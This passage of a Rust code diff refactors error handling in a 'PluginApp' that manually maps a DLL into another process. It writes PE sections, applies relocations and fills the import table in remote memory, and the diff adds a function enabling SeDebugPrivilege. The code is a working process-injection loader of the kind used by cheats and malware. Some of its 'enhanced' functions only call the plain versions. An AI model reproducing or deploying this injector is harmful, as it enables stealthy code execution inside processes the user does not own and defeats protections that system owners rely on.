             let number_of_sections = u16::from_le_bytes(dll_data[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
@@ -817,7 +981,7 @@ impl PluginApp {
                         dll_data.as_ptr().add(pointer_to_raw_data) as _,
                         size_of_raw_data,
                         None,
-                    ).map_err(|e| format!("Failed to write section {}: {}", i, e))?;
+                    ).map_err(|e| anyhow::anyhow!("Failed to write section {}: {}", i, e))?;
                 }
             }
 
@@ -825,7 +989,7 @@ impl PluginApp {
         }
     }
 
-    fn map_pe_sections_aligned(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> Result<(), String> {
+    fn map_pe_sections_aligned(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
         // Enhanced version with proper alignment
         Self::map_pe_sections(dll_data, process_handle, base_addr)
     }
@@ -836,7 +1000,7 @@ impl PluginApp {
         base_addr: *mut c_void, 
         preferred_base: usize, 
         actual_base: usize
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let delta = actual_base.wrapping_sub(preferred_base) as i64;
             if delta == 0 {
@@ -858,7 +1022,7 @@ impl PluginApp {
             }
 
             let reloc_offset = Self::rva_to_offset(dll_data, reloc_rva)
-                .map_err(|e| format!("Invalid relocation table RVA: {}", e))?;
+                .map_err(|e| anyhow::anyhow!("Invalid relocation table RVA: {}", e))?;
 
             let mut current_offset = reloc_offset;
             while current_offset < dll_data.len() {
@@ -898,7 +1062,7 @@ impl PluginApp {
                             &new_value as *const _ as _,
                             8,
                             None,
-                        ).map_err(|e| format!("Failed to apply relocation: {}", e))?;
+                        ).map_err(|e| anyhow::anyhow!("Failed to apply relocation: {}", e))?;
                     }
                 }
 
@@ -909,7 +1073,7 @@ impl PluginApp {
         }
     }
 
-    fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> Result<(), String> {
+    fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
             let optional_header = &dll_data[e_lfanew + 0x18..];
@@ -926,7 +1090,7 @@ impl PluginApp {
             }
 
             let import_offset = Self::rva_to_offset(dll_data, import_rva)
-                .map_err(|e| format!("Invalid import table RVA: {}", e))?;
+                .map_err(|e| anyhow::anyhow!("Invalid import table RVA: {}", e))?;
 
             let mut current_offset = import_offset;
             loop {
@@ -940,19 +1104,19 @@ impl PluginApp {
 
                 // Get DLL name
                 let name_offset = Self::rva_to_offset(dll_data, name_rva)
-                    .map_err(|e| format!("Invalid DLL name RVA: {}", e))?;
+                    .map_err(|e| anyhow::anyhow!("Invalid DLL name RVA: {}", e))?;
                 let dll_name_end = dll_data[name_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                 let dll_name = std::str::from_utf8(&dll_data[name_offset..name_offset + dll_name_end])
-                    .map_err(|e| format!("Invalid DLL name: {}", e))?;
+                    .map_err(|e| anyhow::anyhow!("Invalid DLL name: {}", e))?;
 
                 // Load the DLL in current process to resolve imports
                 let h_module = GetModuleHandleA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                     .or_else(|_| LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr())))
-                    .map_err(|e| format!("Failed to load {}: {}", dll_name, e))?;
+                    .map_err(|e| anyhow::anyhow!("Failed to load {}: {}", dll_name, e))?;
 
                 // Resolve function addresses
                 let mut thunk_offset = Self::rva_to_offset(dll_data, first_thunk)
-                    .map_err(|e| format!("Invalid first thunk RVA: {}", e))?;
+                    .map_err(|e| anyhow::anyhow!("Invalid first thunk RVA: {}", e))?;
                 let mut iat_addr = (base_addr as usize + first_thunk) as *mut u64;
 
                 loop {
@@ -969,10 +1133,10 @@ impl PluginApp {
                         // Import by name
                         let name_table_rva = thunk_value as usize;
                         let name_table_offset = Self::rva_to_offset(dll_data, name_table_rva + 2)
-                            .map_err(|e| format!("Invalid import name RVA: {}", e))?;
+                            .map_err(|e| anyhow::anyhow!("Invalid import name RVA: {}", e))?;
                         let func_name_end = dll_data[name_table_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                         let func_name = std::str::from_utf8(&dll_data[name_table_offset..name_table_offset + func_name_end])
-                            .map_err(|e| format!("Invalid function name: {}", e))?;
+                            .map_err(|e| anyhow::anyhow!("Invalid function name: {}", e))?;
                         
                         GetProcAddress(h_module, PCSTR(format!("{}\0", func_name).as_ptr()))
                     };
@@ -984,7 +1148,7 @@ impl PluginApp {
                             &(addr as u64) as *const _ as _,
                             8,
                             None,
-                        ).map_err(|e| format!("Failed to write IAT entry: {}", e))?;
+                        ).map_err(|e| anyhow::anyhow!("Failed to write IAT entry: {}", e))?;
                     }
 
                     thunk_offset += 8;
@@ -998,7 +1162,7 @@ impl PluginApp {
         }
     }
 
-    fn resolve_imports_comprehensive(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> Result<(), String> {
+    fn resolve_imports_comprehensive(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
         // Enhanced version with better error handling
         Self::resolve_imports(dll_data, process_handle, base_addr)
     }
@@ -1044,10 +1208,41 @@ impl PluginApp {
         }
     }
 
-    fn get_dll_main_rva(dll_data: &[u8]) -> Result<u32, String> {
+    fn get_dll_main_rva(dll_data: &[u8]) -> anyhow::Result<u32, anyhow::Error> {
         let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
         let optional_header = &dll_data[e_lfanew + 0x18..];
         let entry_rva = u32::from_le_bytes(optional_header[0x10..0x14].try_into().unwrap());
         Ok(entry_rva)
     }
+}
+
+// Enable SeDebugPrivilege for the current process
+pub fn enable_debug_privilege() -> anyhow::Result<(), anyhow::Error> {
+    unsafe {
+        let mut h_token: HANDLE = HANDLE(std::ptr::null_mut());
+
+        OpenProcessToken(
+            GetCurrentProcess(), 
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
+            &mut h_token
+        ).context("OpenProcessToken failed")?;
+
+        let mut luid = LUID::default();
+
+        LookupPrivilegeValueA(
+            None, 
+            PCSTR(b"SeDebugPrivilege\0".as_ptr()), 
+            &mut luid
+        ).context("LookupPrivilegeValueA failed")?;
+
+        let tp = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
+                Luid: luid,
+                Attributes: SE_PRIVILEGE_ENABLED,
+            }; 1],
+        };
+        AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None).context("AdjustTokenPrivileges failed")?;
+    }
+    Ok(())
 }
